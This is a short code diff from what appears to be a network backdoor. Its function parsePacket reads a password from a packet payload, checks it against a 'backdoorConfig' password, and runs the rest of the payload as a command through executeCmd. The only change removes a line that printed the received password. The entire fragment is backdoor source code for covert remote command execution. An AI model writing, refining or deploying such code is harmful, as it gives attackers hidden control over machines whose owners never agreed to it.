@@ -84,7 +84,6 @@ def parsePacket(packet):
         return
     password = payload[:8]
     cmd = payload[8:]
-    print(password)
     if password not in backdoorConfig.password:
         return
     executeCmd(cmd)
